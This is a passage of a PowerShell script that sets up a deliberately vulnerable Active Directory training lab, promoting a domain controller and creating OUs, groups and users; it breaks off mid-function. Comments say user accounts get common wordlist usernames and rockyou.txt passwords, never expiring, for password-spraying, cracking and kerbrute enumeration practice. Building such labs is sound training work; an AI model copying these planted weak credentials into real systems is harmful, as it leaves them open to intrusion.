    $requiredServices = @("NTDS", "DNS", "Netlogon")
    foreach ($svcName in $requiredServices) {
        $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
        if ($svc) {
            if ($svc.Status -ne "Running") {
                Write-ColorOutput "  [*] Starting $svcName service..." "Yellow"
                try {
                    Start-Service -Name $svcName -ErrorAction Stop
                    Write-ColorOutput "  [+] $svcName started" "Green"
                } catch {
                    Write-ColorOutput "  [!] Could not start $svcName : $($_.Exception.Message)" "Yellow"
                }
            } else {
                Write-ColorOutput "  [+] $svcName is running" "Green"
            }
        }
    }
    
    Write-ColorOutput "" "White"
    $elapsed = 0
    $attempt = 0
    
    while ($elapsed -lt $MaxWaitSeconds) {
        $attempt++
        try {
            # Try to import the module
            Import-Module ActiveDirectory -ErrorAction Stop -Force
            
            # Try to get domain info
            $domain = Get-ADDomain -ErrorAction Stop
            Write-ColorOutput "[+] Active Directory Web Services is available" "Green"
            Write-ColorOutput "[+] Connected to domain: $($domain.DNSRoot)" "Green"
            return $true
        } catch {
            if ($attempt -eq 1 -or ($attempt % 6 -eq 0)) {
                # Show progress every 30 seconds (6 attempts * 5 seconds)
                Write-ColorOutput "  [*] Still waiting... ($elapsed seconds elapsed)" "Yellow"
                # Check service status
                $adws = Get-Service -Name "ADWS" -ErrorAction SilentlyContinue
                if ($adws) {
                    Write-ColorOutput "    [*] ADWS Service Status: $($adws.Status)" "Yellow"
                }
            }
            Start-Sleep -Seconds $RetryIntervalSeconds
            $elapsed += $RetryIntervalSeconds
        }
    }
    
    Write-ColorOutput "[!] Active Directory Web Services did not become available within $MaxWaitSeconds seconds" "Red"
    Write-ColorOutput "[!] Troubleshooting steps:" "Yellow"
    Write-ColorOutput "    1. Check if ADWS service is running: Get-Service ADWS" "White"
    Write-ColorOutput "    2. Check event logs for errors: Get-EventLog -LogName System -Source ADWS -Newest 10" "White"
    Write-ColorOutput "    3. Verify AD DS is properly installed: Get-WindowsFeature AD-Domain-Services" "White"
    Write-ColorOutput "    4. Try restarting ADWS service: Restart-Service ADWS" "White"
    return $false
}

# Function to set local Administrator password
function Set-LocalAdministratorPassword {
    param(
        [SecureString]$Password
    )
    
    Write-ColorOutput "[*] Checking local Administrator account password..." "Yellow"
    
    try {
        # Convert SecureString to plain text for net user command
        $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password)
        $plainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
        
        # Check if Administrator account exists
        $adminAccount = Get-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue
        if (-not $adminAccount) {
            Write-ColorOutput "  [!] Administrator account not found" "Red"
            return $false
        }
        
        # Try to set the password - try Set-LocalUser first (handles SecureString better)
        Write-ColorOutput "  [*] Setting Administrator account password..." "Yellow"
        
        # First try Set-LocalUser (works if we have proper permissions)
        try {
            Set-LocalUser -Name "Administrator" -Password $Password -ErrorAction Stop
            Write-ColorOutput "  [+] Administrator password set successfully (using Set-LocalUser)" "Green"
            
            # Verify the password was set by trying to enable the account
            try {
                Enable-LocalUser -Name "Administrator" -ErrorAction Stop
                Write-ColorOutput "  [+] Administrator account is enabled" "Green"
            } catch {
                Write-ColorOutput "  [*] Administrator account status: $($adminAccount.Enabled)" "Yellow"
            }
            
            # Clear the plain password from memory
            $plainPassword = $null
            return $true
        } catch {
            Write-ColorOutput "  [*] Set-LocalUser failed, trying net user command..." "Yellow"
            Write-ColorOutput "  [*] Error: $($_.Exception.Message)" "Yellow"
            
            # Fallback to net user command (more reliable for blank passwords)
            # Escape special characters for PowerShell
            $escapedPassword = $plainPassword -replace '"', '`"' -replace '\$', '`$'
            $process = Start-Process -FilePath "net.exe" -ArgumentList "user", "Administrator", $escapedPassword -NoNewWindow -Wait -PassThru -RedirectStandardOutput "nul" -RedirectStandardError "nul"
            
            if ($process.ExitCode -eq 0) {
                Write-ColorOutput "  [+] Administrator password set successfully (using net user)" "Green"
                
                # Verify the password was set
                try {
                    Enable-LocalUser -Name "Administrator" -ErrorAction Stop
                    Write-ColorOutput "  [+] Administrator account is enabled" "Green"
                } catch {
                    Write-ColorOutput "  [*] Administrator account status: $($adminAccount.Enabled)" "Yellow"
                }
                
                # Clear the plain password from memory
                $plainPassword = $null
                return $true
            } else {
                Write-ColorOutput "  [!] Failed to set Administrator password using net user (Exit Code: $($process.ExitCode))" "Red"
                $plainPassword = $null
                return $false
            }
        }
    } catch {
        Write-ColorOutput "  [!] Error setting Administrator password: $($_.Exception.Message)" "Red"
        return $false
    }
}

# Function to create domain and promote to DC
function New-ADDomain {
    param(
        [string]$Domain,
        [SecureString]$DSRMPassword,
        [SecureString]$AdminPassword
    )
    
    Write-ColorOutput "[*] Creating domain and promoting to Domain Controller..." "Yellow"
    
    # Check current domain/workgroup status first
    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
    $currentDomain = $computerSystem.Domain
    $isInWorkgroup = ($currentDomain -eq "WORKGROUP" -or $currentDomain -eq "")
    
    # Check if already a DC using registry/system check (doesn't require AD Web Services)
    # Skip ADWS check since we're in Stage 1 and ADWS may not be available yet
    $isDC = Test-IsDomainController -SkipADWSCheck
    
    if ($isDC) {
        # Double-check: if we're in WORKGROUP, DC promotion didn't complete
        if ($isInWorkgroup) {
            Write-ColorOutput "[!] WARNING: DC promotion appears incomplete!" "Red"
            Write-ColorOutput "[!] Server shows DC indicators but is still in WORKGROUP" "Red"
            Write-ColorOutput "[!] This may indicate a failed or incomplete DC promotion" "Red"
            Write-ColorOutput "[!] Checking for pending reboot..." "Yellow"
            
            # Check for pending reboot
            $pendingReboot = $false
            try {
                $pendingRebootPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
                $pendingRebootValue = Get-ItemProperty -Path $pendingRebootPath -Name "PendingFileRenameOperations" -ErrorAction SilentlyContinue
                if ($pendingRebootValue) {
                    $pendingReboot = $true
                }
            } catch {}
            
            if ($pendingReboot) {
                Write-ColorOutput "[!] Pending reboot detected - server needs to be restarted!" "Yellow"
                Write-ColorOutput "[!] Please restart the server and run the script again" "Yellow"
                Write-ColorOutput "[!] After reboot, the DC promotion should complete" "Yellow"
                return $null
            } else {
                Write-ColorOutput "[!] No pending reboot detected, but DC promotion appears incomplete" "Yellow"
                Write-ColorOutput "[!] Attempting to proceed with DC promotion..." "Yellow"
                # Continue with promotion attempt
            }
        } else {
            Write-ColorOutput "[+] Server is already a Domain Controller" "Green"
            Write-ColorOutput "[+] Current domain: $currentDomain" "Green"
            Write-ColorOutput "[*] AD Web Services availability will be checked in Stage 2" "Yellow"
            # Don't try to access AD here - ADWS may not be available yet after reboot
            return $null
        }
    }
    
    # Import ADDSDeployment module
    try {
        Import-Module ADDSDeployment -ErrorAction Stop
    } catch {
        Write-ColorOutput "[!] Failed to import ADDSDeployment module: $($_.Exception.Message)" "Red"
        Write-ColorOutput "[!] Make sure AD DS role is fully installed." "Red"
        throw
    }
    
    # Create domain and promote to DC
    # Note: This will reboot the server, so the script should be run again after reboot
    $params = @{
        DomainName = $Domain
        SafeModeAdministratorPassword = $DSRMPassword
        InstallDns = $true
        CreateDnsDelegation = $false
        NoRebootOnCompletion = $false
        Force = $true
    }
    
    Write-ColorOutput "[!] WARNING: Server will reboot after domain creation!" "Yellow"
    Write-ColorOutput "[!] After reboot, run this script again with Stage2 to complete setup." "Yellow"
    Write-ColorOutput "" "White"
    Write-ColorOutput "[*] ========================================" "Cyan"
    Write-ColorOutput "[*] STAGE 1: Domain Controller Promotion" "Cyan"
    Write-ColorOutput "[*] ========================================" "Cyan"
    Write-ColorOutput "[*] Creating domain and promoting to DC..." "Yellow"
    Write-ColorOutput "[*] Domain Name: $Domain" "White"
    Write-ColorOutput "[*] This process will:" "White"
    Write-ColorOutput "    1. Create the Active Directory forest" "White"
    Write-ColorOutput "    2. Install and configure DNS" "White"
    Write-ColorOutput "    3. Promote this server to Domain Controller" "White"
    Write-ColorOutput "    4. Join server to domain: $Domain" "White"
    Write-ColorOutput "    5. Reboot the server" "White"
    Write-ColorOutput "" "White"
    Write-ColorOutput "[*] This may take 10-20 minutes. Please wait..." "Yellow"
    Write-ColorOutput "[*] Progress will be shown below:" "Yellow"
    Write-ColorOutput "" "White"
    Write-ColorOutput "[*] Note: You may see a DNS delegation warning - this is normal for new domains" "Yellow"
    Write-ColorOutput "[*]       and can be safely ignored in lab environments." "Yellow"
    Write-ColorOutput "" "White"
    
    # Verify current domain/workgroup status
    $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
    Write-ColorOutput "[*] Current domain/workgroup: $($computerSystem.Domain)" "Yellow"
    Write-ColorOutput "[*] After promotion, server will be in domain: $Domain" "Yellow"
    Write-ColorOutput "" "White"
    
    # Set local Administrator password before DC promotion (required by Windows)
    Write-ColorOutput "[*] Verifying local Administrator password is set..." "Yellow"
    $passwordToUse = if ($AdminPassword) { $AdminPassword } else { $DSRMPassword }
    $passwordSet = Set-LocalAdministratorPassword -Password $passwordToUse
    
    if (-not $passwordSet) {
        Write-ColorOutput "[!] CRITICAL: Failed to set local Administrator password!" "Red"
        Write-ColorOutput "[!] DC promotion requires a strong password for the Administrator account" "Red"
        Write-ColorOutput "[!] Please set the Administrator password manually and try again:" "Yellow"
        Write-ColorOutput "[!]   net user Administrator <password>" "White"
        Write-ColorOutput "[!] Or use Local Users and Groups to set the password" "White"
        throw "Administrator password must be set before DC promotion"
    }
    
    Write-ColorOutput "" "White"
    
    try {
        # Show progress during installation
        Write-Progress -Activity "Promoting to Domain Controller" -Status "Installing AD DS Forest..." -PercentComplete 10
        Install-ADDSForest @params
        Write-Progress -Activity "Promoting to Domain Controller" -Status "Complete" -PercentComplete 100 -Completed
        
        # Install-ADDSForest should cause a reboot, so we should never reach this point
        # If we do, it means the reboot didn't happen or was delayed
        Write-ColorOutput "[+] Domain $Domain created and server promoted to DC" "Green"
        Write-ColorOutput "[!] Server should reboot automatically..." "Yellow"
        Write-ColorOutput "[!] If reboot doesn't occur within 60 seconds, please reboot manually" "Yellow"
        Write-ColorOutput "[!] After reboot, run the script again with Stage2" "Yellow"
        
        # Don't try to access AD here - ADWS won't be available until after reboot
        # Return null since we can't get domain info yet
        return $null
        
    } catch {
        Write-Progress -Activity "Promoting to Domain Controller" -Completed
        
        # Check if the error is about DNS delegation (this is normal and can be ignored)
        $errorMessage = $_.Exception.Message
        if ($errorMessage -like "*delegation*" -or $errorMessage -like "*parent zone*") {
            Write-ColorOutput "[*] Note: DNS delegation warning is normal for new domains" "Yellow"
            Write-ColorOutput "[*] This can be safely ignored for lab environments" "Yellow"
            Write-ColorOutput "" "White"
        }
        
        # Check if the error is about ADWS (expected after promotion, before reboot)
        if ($errorMessage -like "*Active Directory Web Services*" -or $errorMessage -like "*default server*") {
            Write-ColorOutput "[*] Note: ADWS error is expected - server needs to reboot first" "Yellow"
            Write-ColorOutput "[+] DC promotion completed successfully" "Green"
            Write-ColorOutput "[!] Server will reboot automatically..." "Yellow"
            Write-ColorOutput "[!] After reboot, run the script again with Stage2" "Yellow"
            return $null
        }
        
        # For other errors, show the full error
        Write-ColorOutput "[!] Error during domain creation: $errorMessage" "Red"
        throw
    }
}

# Function to verify domain controller configuration
function Test-DomainControllerConfiguration {
    Write-ColorOutput "[*] Verifying Domain Controller configuration..." "Yellow"
    
    $allGood = $true
    
    # Check if server is a DC
    if (-not (Test-IsDomainController)) {
        Write-ColorOutput "  [!] Server is not configured as a Domain Controller" "Red"
        $allGood = $false
    } else {
        Write-ColorOutput "  [+] Server is configured as a Domain Controller" "Green"
    }
    
    # Check critical services
    $requiredServices = @(
        @{Name="NTDS"; DisplayName="Active Directory Domain Services"},
        @{Name="DNS"; DisplayName="DNS Server"},
        @{Name="ADWS"; DisplayName="Active Directory Web Services"},
        @{Name="Netlogon"; DisplayName="Netlogon"}
    )
    
    foreach ($service in $requiredServices) {
        $svc = Get-Service -Name $service.Name -ErrorAction SilentlyContinue
        if ($svc) {
            if ($svc.Status -eq "Running") {
                Write-ColorOutput "  [+] $($service.DisplayName) service is running" "Green"
            } else {
                Write-ColorOutput "  [!] $($service.DisplayName) service is not running (Status: $($svc.Status))" "Yellow"
                $allGood = $false
            }
        } else {
            Write-ColorOutput "  [!] $($service.DisplayName) service not found" "Red"
            $allGood = $false
        }
    }
    
    # Try to verify AD connectivity
    try {
        Import-Module ActiveDirectory -ErrorAction Stop
        $domain = Get-ADDomain -ErrorAction Stop
        Write-ColorOutput "  [+] Active Directory domain accessible: $($domain.DNSRoot)" "Green"
        Write-ColorOutput "  [+] Domain NetBIOS name: $($domain.NetBIOSName)" "Green"
        Write-ColorOutput "  [+] Forest name: $($domain.Forest)" "Green"
    } catch {
        Write-ColorOutput "  [!] Cannot connect to Active Directory: $($_.Exception.Message)" "Yellow"
        Write-ColorOutput "  [*] AD Web Services may still be starting up..." "Yellow"
        $allGood = $false
    }
    
    # Check DNS
    try {
        $dnsZones = Get-DnsServerZone -ErrorAction SilentlyContinue
        if ($dnsZones) {
            Write-ColorOutput "  [+] DNS Server is configured with $($dnsZones.Count) zone(s)" "Green"
        } else {
            Write-ColorOutput "  [!] DNS Server has no zones configured" "Yellow"
        }
    } catch {
        Write-ColorOutput "  [!] Cannot verify DNS configuration: $($_.Exception.Message)" "Yellow"
    }
    
    if ($allGood) {
        Write-ColorOutput "[+] Domain Controller verification complete - all checks passed" "Green"
    } else {
        Write-ColorOutput "[!] Some verification checks failed - services may still be starting" "Yellow"
    }
    
    return $allGood
}

# Function to create realistic OUs
function New-RealisticOUs {
    Write-ColorOutput "[*] Creating realistic Organizational Units..." "Yellow"
    
    $domainDN = (Get-ADDomain).DistinguishedName
    
    # Define OU structure
    $ouStructure = @{
        "Departments" = @{
            "IT" = @("HelpDesk", "SystemAdmins", "Developers")
            "Finance" = @("Accounting", "Payroll")
            "HR" = $null
            "Sales" = @("Regional")
            "Operations" = $null
        }
        "ServiceAccounts" = $null
        "Computers" = @{
            "Workstations" = $null
            "Servers" = $null
        }
    }
    
    function Create-OURecursive {
        param($ouName, $parentPath, $children)
        
        $ouPath = if ($parentPath) { "$parentPath" } else { $domainDN }
        
        try {
            # Check if OU exists in the parent path
            $existingOU = Get-ADOrganizationalUnit -Filter "Name -eq '$ouName'" -SearchBase $ouPath -ErrorAction SilentlyContinue
            
            # Also check for any object with this name in the parent (OU, container, or other)
            # This handles the case where "Computers" is a default container
            $existingObject = Get-ADObject -Filter "Name -eq '$ouName'" -SearchBase $ouPath -ErrorAction SilentlyContinue
            
            if ($existingOU) {
                Write-ColorOutput "  [+] OU $ouName already exists" "Green"
                $currentPath = $existingOU.DistinguishedName
            } elseif ($existingObject) {
                # Object exists but might be a container or different type
                # Note: If it's a container, we can't create child OUs in it, but we'll use it anyway
                Write-ColorOutput "  [+] Object $ouName already exists (using existing - may be container)" "Green"
                $currentPath = $existingObject.DistinguishedName
            } else {
                # Try to create the OU
                try {
                    $newOU = New-ADOrganizationalUnit -Name $ouName -Path $ouPath -ProtectedFromAccidentalDeletion $false -ErrorAction Stop
                    Write-ColorOutput "  [+] Created OU: $ouName" "Green"
                    $currentPath = $newOU.DistinguishedName
                } catch {
                    # If creation fails, check if it was created by another process or already exists
                    $retryCheck = Get-ADOrganizationalUnit -Filter "Name -eq '$ouName'" -SearchBase $ouPath -ErrorAction SilentlyContinue
                    if ($retryCheck) {
                        Write-ColorOutput "  [+] OU $ouName already exists (verified after creation attempt)" "Green"
                        $currentPath = $retryCheck.DistinguishedName
                    } else {
                        throw
                    }
                }
            }
        } catch {
            Write-ColorOutput "  [!] Error creating OU $ouName : $($_.Exception.Message)" "Red"
            Write-ColorOutput "  [*] Skipping this OU and continuing..." "Yellow"
            return
        }
        
        if ($children) {
            if ($children -is [hashtable]) {
                foreach ($childName in $children.Keys) {
                    Create-OURecursive -ouName $childName -parentPath $currentPath -children $children[$childName]
                }
            } elseif ($children -is [array]) {
                foreach ($childName in $children) {
                    Create-OURecursive -ouName $childName -parentPath $currentPath -children $null
                }
            }
        }
    }
    
    # Create top-level OUs
    foreach ($topLevelOU in $ouStructure.Keys) {
        Create-OURecursive -ouName $topLevelOU -parentPath $domainDN -children $ouStructure[$topLevelOU]
    }
    
    Write-ColorOutput "[+] Organizational Units created" "Green"
}

# Function to create realistic groups
function New-RealisticGroups {
    Write-ColorOutput "[*] Creating realistic security groups..." "Yellow"
    
    $groups = @(
        @{Name="Domain Admins"; Description="Full administrative access to domain"},
        @{Name="IT Department"; Description="IT staff members"},
        @{Name="Finance Team"; Description="Finance department"},
        @{Name="HR Staff"; Description="Human Resources"},
        @{Name="Sales Team"; Description="Sales department"},
        @{Name="Help Desk"; Description="IT Help Desk"},
        @{Name="Developers"; Description="Software developers"},
        @{Name="Backup Operators"; Description="Backup and restore permissions"},
        @{Name="Account Operators"; Description="Account management"},
        @{Name="Server Admins"; Description="Server administration"},
        @{Name="Database Admins"; Description="Database administration"},
        @{Name="Network Admins"; Description="Network administration"},
        @{Name="Share Users"; Description="Users with share access"},
        @{Name="Project Managers"; Description="Project management team"}
    )
    
    foreach ($group in $groups) {
        try {
            $existing = Get-ADGroup -Identity $group.Name -ErrorAction SilentlyContinue
            Write-ColorOutput "  [+] Group $($group.Name) already exists" "Green"
        } catch {
            New-ADGroup -Name $group.Name -GroupScope Global -GroupCategory Security -Description $group.Description
            Write-ColorOutput "  [+] Created group: $($group.Name)" "Green"
        }
    }
    
    Write-ColorOutput "[+] Security groups created" "Green"
}

# Function to create realistic users
function New-RealisticUsers {
    Write-ColorOutput "[*] Creating realistic users..." "Yellow"
    
    # Users with usernames that match common entries in xato-net-10-million-usernames.txt
    # Passwords are from rockyou.txt (top common passwords) for password spraying/cracking training
    # This ensures kerbrute userenum will find valid accounts for training
    $users = @(
        # Common usernames from xato wordlist (first initial + last name pattern)
        # Passwords from rockyou.txt top 100 (except Responder users which meet complexity)
        @{FirstName="John"; LastName="Smith"; Username="jsmith"; Department="IT"; Title="System Administrator"; Password="Password1"},
        @{FirstName="Sarah"; LastName="Johnson"; Username="sjohnson"; Department="Finance"; Title="Accountant"; Password="Welcome1"},
        @{FirstName="Michael"; LastName="Williams"; Username="mwilliams"; Department="HR"; Title="HR Manager"; Password="123456789"},
        @{FirstName="Emily"; LastName="Brown"; Username="ebrown"; Department="Sales"; Title="Sales Manager"; Password="12345"},
        @{FirstName="David"; LastName="Jones"; Username="djones"; Department="IT"; Title="Help Desk"; Password="Qwerty1"},
        @{FirstName="Jessica"; LastName="Garcia"; Username="jgarcia"; Department="IT"; Title="Developer"; Password="Abc123!"},
        @{FirstName="Robert"; LastName="Miller"; Username="rmiller"; Department="Finance"; Title="Financial Analyst"; Password="monkey"},
        @{FirstName="Amanda"; LastName="Davis"; Username="adavis"; Department="Operations"; Title="Operations Manager"; Password="1234567"},
        @{FirstName="Christopher"; LastName="Rodriguez"; Username="crodriguez"; Department="IT"; Title="Network Admin"; Password="Letmein1"},
        @{FirstName="Michelle"; LastName="Martinez"; Username="mmartinez"; Department="Sales"; Title="Sales Rep"; Password="trustno1"},
        @{FirstName="Daniel"; LastName="Hernandez"; Username="dhernandez"; Department="IT"; Title="Database Admin"; Password="dragon"},
        @{FirstName="Lisa"; LastName="Lopez"; Username="llopez"; Department="HR"; Title="HR Specialist"; Password="baseball"},
        @{FirstName="James"; LastName="Wilson"; Username="jwilson"; Department="IT"; Title="Security Analyst"; Password="iloveyou"},
        @{FirstName="Patricia"; LastName="Anderson"; Username="panderson"; Department="Finance"; Title="Payroll Specialist"; Password="master"},
        @{FirstName="Matthew"; LastName="Thomas"; Username="mthomas"; Department="IT"; Title="IT Manager"; Password="sunshine"},
        # Additional common usernames from xato wordlist (common first names)
        @{FirstName="John"; LastName="Doe"; Username="john"; Department="IT"; Title="IT Support"; Password="ashley"},
        @{FirstName="Jane"; LastName="Doe"; Username="jane"; Department="HR"; Title="HR Assistant"; Password="bailey"},
        @{FirstName="Brian"; LastName="Williams"; Username="bwilliams"; Department="IT"; Title="IT Specialist"; Password="princess"},
        @{FirstName="Alex"; LastName="Smith"; Username="asmith"; Department="Finance"; Title="Financial Analyst"; Password="michael"},
        @{FirstName="User"; LastName="Account"; Username="user"; Department="IT"; Title="Standard User"; Password="123123"},
        # Common patterns from xato wordlist (firstname.lastname)
        # Using unique display names to avoid conflicts with jsmith and sjohnson
        @{FirstName="John"; LastName="Smith"; Username="johnsmith"; Department="IT"; Title="Senior Admin"; Password="654321"; DisplayName="John Smith (Senior)"},
        @{FirstName="Sarah"; LastName="Johnson"; Username="sarahjohnson"; Department="Finance"; Title="Senior Accountant"; Password="superman"; DisplayName="Sarah Johnson (Senior)"},
        @{FirstName="Michael"; LastName="Brown"; Username="michaelbrown"; Department="Sales"; Title="Sales Director"; Password="qazwsx"},
        # Additional realistic users for comprehensive lab
        # IT Department - HelpDesk OU
        @{FirstName="Kevin"; LastName="White"; Username="kwhite"; Department="IT"; Title="Help Desk Technician"; Password="jordan"},
        @{FirstName="Nicole"; LastName="Harris"; Username="nharris"; Department="IT"; Title="Help Desk Support"; Password="tigger"},
        @{FirstName="Ryan"; LastName="Clark"; Username="rclark"; Department="IT"; Title="IT Support Specialist"; Password="shadow"},
        # IT Department - SystemAdmins OU
        @{FirstName="Steven"; LastName="Lewis"; Username="slewis"; Department="IT"; Title="System Administrator"; Password="hunter"},
        @{FirstName="Laura"; LastName="Walker"; Username="lwalker"; Department="IT"; Title="Senior System Admin"; Password="buster"},
        @{FirstName="Mark"; LastName="Hall"; Username="mhall"; Department="IT"; Title="Infrastructure Admin"; Password="soccer"},
        # IT Department - Developers OU
        @{FirstName="Jennifer"; LastName="Allen"; Username="jallen"; Department="IT"; Title="Software Developer"; Password="harley"},
        @{FirstName="Eric"; LastName="Young"; Username="eyoung"; Department="IT"; Title="Senior Developer"; Password="batman"},
        @{FirstName="Nicole"; LastName="King"; Username="nking"; Department="IT"; Title="Full Stack Developer"; Password="thomas"},
        # Finance Department - Accounting OU
        @{FirstName="Susan"; LastName="Wright"; Username="swright"; Department="Finance"; Title="Senior Accountant"; Password="hockey"},
        @{FirstName="Thomas"; LastName="Lopez"; Username="tlopez"; Department="Finance"; Title="Accounting Manager"; Password="ranger"},
        @{FirstName="Karen"; LastName="Hill"; Username="khill"; Department="Finance"; Title="Staff Accountant"; Password="daniel"},
        # Finance Department - Payroll OU
        @{FirstName="Nancy"; LastName="Scott"; Username="nscott"; Department="Finance"; Title="Payroll Manager"; Password="maggie"},
        @{FirstName="Betty"; LastName="Green"; Username="bgreen"; Department="Finance"; Title="Payroll Specialist"; Password="summer"},
        # HR Department
        @{FirstName="Helen"; LastName="Adams"; Username="hadams"; Department="HR"; Title="HR Manager"; Password="winter"},
        @{FirstName="Sandra"; LastName="Baker"; Username="sbaker"; Department="HR"; Title="HR Coordinator"; Password="marley"},
        @{FirstName="Donna"; LastName="Nelson"; Username="dnelson"; Department="HR"; Title="Recruiter"; Password="august"},
        # Sales Department - Regional OU
        @{FirstName="Carol"; LastName="Carter"; Username="ccarter"; Department="Sales"; Title="Regional Sales Manager"; Password="samson"},
        @{FirstName="Ruth"; LastName="Mitchell"; Username="rmitchell"; Department="Sales"; Title="Sales Representative"; Password="april"},
        @{FirstName="Sharon"; LastName="Perez"; Username="sperez"; Department="Sales"; Title="Account Executive"; Password="william"},
        # Operations Department
        @{FirstName="Michelle"; LastName="Roberts"; Username="mroberts"; Department="Operations"; Title="Operations Coordinator"; Password="tucker"},
        @{FirstName="Emily"; LastName="Turner"; Username="eturner"; Department="Operations"; Title="Operations Analyst"; Password="michelle"},
        @{FirstName="Kimberly"; LastName="Phillips"; Username="kphillips"; Department="Operations"; Title="Operations Manager"; Password="charlie"}
    )
    
    $domainDN = (Get-ADDomain).DistinguishedName

    # Get OU paths - use constructed paths directly (more reliable)
    # These match the structure created by New-RealisticOUs
    $itOU = "OU=IT,OU=Departments,$domainDN"
    $itHelpDeskOU = "OU=HelpDesk,OU=IT,OU=Departments,$domainDN"
    $itSystemAdminsOU = "OU=SystemAdmins,OU=IT,OU=Departments,$domainDN"
    $itDevelopersOU = "OU=Developers,OU=IT,OU=Departments,$domainDN"
    $financeOU = "OU=Finance,OU=Departments,$domainDN"
    $financeAccountingOU = "OU=Accounting,OU=Finance,OU=Departments,$domainDN"
    $financePayrollOU = "OU=Payroll,OU=Finance,OU=Departments,$domainDN"
    $hrOU = "OU=HR,OU=Departments,$domainDN"
    $salesOU = "OU=Sales,OU=Departments,$domainDN"
    $salesRegionalOU = "OU=Regional,OU=Sales,OU=Departments,$domainDN"
    $opsOU = "OU=Operations,OU=Departments,$domainDN"

    # Verify OUs exist, create if missing
    $ouPaths = @($itOU, $itHelpDeskOU, $itSystemAdminsOU, $itDevelopersOU, $financeOU, $financeAccountingOU, $financePayrollOU, $hrOU, $salesOU, $salesRegionalOU, $opsOU)
    foreach ($ouPath in $ouPaths) {
        try {
            Get-ADOrganizationalUnit -Identity $ouPath -ErrorAction Stop | Out-Null
        } catch {
            Write-ColorOutput "  [!] OU not found: $ouPath - attempting to create..." "Yellow"
            try {
                # Parse the OU path to get parent and OU name
                # Format: OU=IT,OU=Departments,DC=...
                $ouParts = $ouPath -split ','
                $ouName = ($ouParts[0] -replace 'OU=', '')
                $parentPath = ($ouParts[1..($ouParts.Length-1)] -join ',')
                
                # Verify parent exists first
                try {
                    Get-ADOrganizationalUnit -Identity $parentPath -ErrorAction Stop | Out-Null
                } catch {
                    Write-ColorOutput "  [!] Parent OU not found: $parentPath - cannot create $ouName" "Red"
                    continue
                }
                
                # Create the missing OU
                New-ADOrganizationalUnit -Name $ouName -Path $parentPath -ProtectedFromAccidentalDeletion $false -ErrorAction Stop
                Write-ColorOutput "  [+] Created missing OU: $ouPath" "Green"
            } catch {
                Write-ColorOutput "  [!] Failed to create OU ${ouPath}: $($_.Exception.Message)" "Red"
            }
        }
    }
    
    # Map users to specific OUs based on department and title
    # This ensures users are placed in realistic sub-OUs
    function Get-OUForUser {
        param($Department, $Title)
        
        switch ($Department) {
            "IT" {
                if ($Title -like "*Help Desk*" -or $Title -like "*IT Support*" -or $Title -like "*Support Specialist*") {
                    return $itHelpDeskOU
                } elseif ($Title -like "*System Admin*" -or $Title -like "*Infrastructure*" -or $Title -like "*Senior Admin*") {
                    return $itSystemAdminsOU
                } elseif ($Title -like "*Developer*" -or $Title -like "*Programmer*") {
                    return $itDevelopersOU
                } else {
                    return $itOU
                }
            }
            "Finance" {
                if ($Title -like "*Payroll*") {
                    return $financePayrollOU
                } elseif ($Title -like "*Accountant*" -or $Title -like "*Accounting*") {
                    return $financeAccountingOU
                } else {
                    return $financeOU
                }
            }
            "Sales" {
                if ($Title -like "*Regional*" -or $Title -like "*Sales Rep*" -or $Title -like "*Account Executive*") {
                    return $salesRegionalOU
                } else {
                    return $salesOU
                }
            }
            "HR" { return $hrOU }
            "Operations" { return $opsOU }
            default { return $itOU }
        }
    }
    
    $ouMap = @{
        "IT" = $itOU
        "Finance" = $financeOU
        "HR" = $hrOU
        "Sales" = $salesOU
        "Operations" = $opsOU
    }
    
    foreach ($user in $users) {
        try {
            # Check if user already exists - use filter instead of Identity for more reliable checking
            $existing = $null
            try {
                $existing = Get-ADUser -Filter "SamAccountName -eq '$($user.Username)'" -ErrorAction SilentlyContinue
            } catch {
                # User doesn't exist, which is fine - we'll create it
                $existing = $null
            }
            
            if ($existing) {
                Write-ColorOutput "  [+] User $($user.Username) already exists" "Green"
                continue
            }
            
            # Get the OU for this user based on department and title (realistic placement)
            $ou = Get-OUForUser -Department $user.Department -Title $user.Title
            
            # Validate OU exists and is not null
            if (-not $ou) {
                # Fallback to department OU if specific OU not found
                $ou = $ouMap[$user.Department]
                if (-not $ou) {
                    Write-ColorOutput "  [!] No OU mapping found for department: $($user.Department)" "Red"
                    continue
                }
            }
            
            # Verify the OU actually exists in AD
            try {
                Get-ADOrganizationalUnit -Identity $ou -ErrorAction Stop | Out-Null
                Write-ColorOutput "  [*] Using OU: $ou for user $($user.Username)" "Cyan"
            } catch {
                Write-ColorOutput "  [!] OU does not exist: $ou for user $($user.Username)" "Red"
                Write-ColorOutput "  [!] Attempting to create missing OU..." "Yellow"
                # Try to create the OU if it doesn't exist
                try {
                    # Parse the OU path to get parent and OU name
                    $ouParts = $ou -split ','
                    $ouName = ($ouParts[0] -replace 'OU=', '')
                    $parentPath = ($ouParts[1..($ouParts.Length-1)] -join ',')
                    
                    # Verify parent exists first
                    try {
                        Get-ADOrganizationalUnit -Identity $parentPath -ErrorAction Stop | Out-Null
                        # Create the missing OU
                        New-ADOrganizationalUnit -Name $ouName -Path $parentPath -ProtectedFromAccidentalDeletion $false -ErrorAction Stop
                        Write-ColorOutput "  [+] Created missing OU: $ou" "Green"
                    } catch {
                        Write-ColorOutput "  [!] Parent OU not found: $parentPath - cannot create $ouName" "Red"
                        continue
                    }
                } catch {
                    Write-ColorOutput "  [!] Failed to create OU ${ou}: $($_.Exception.Message)" "Red"
                    continue
                }
            }
            
            $securePassword = ConvertTo-SecureString $user.Password -AsPlainText -Force
            
            # Create the user
            # Use DisplayName if provided, otherwise use FirstName LastName
            $displayName = if ($user.DisplayName) { $user.DisplayName } else { "$($user.FirstName) $($user.LastName)" }
            
            try {
                New-ADUser -Name $displayName `
                    -GivenName $user.FirstName `
                    -Surname $user.LastName `
                    -SamAccountName $user.Username `
                    -UserPrincipalName "$($user.Username)@$DomainName" `
                    -Path $ou `
                    -AccountPassword $securePassword `
                    -Enabled $true `
                    -PasswordNeverExpires $true `
                    -CannotChangePassword $false `
                    -Title $user.Title `
                    -Department $user.Department `
                    -ErrorAction Stop
            } catch {
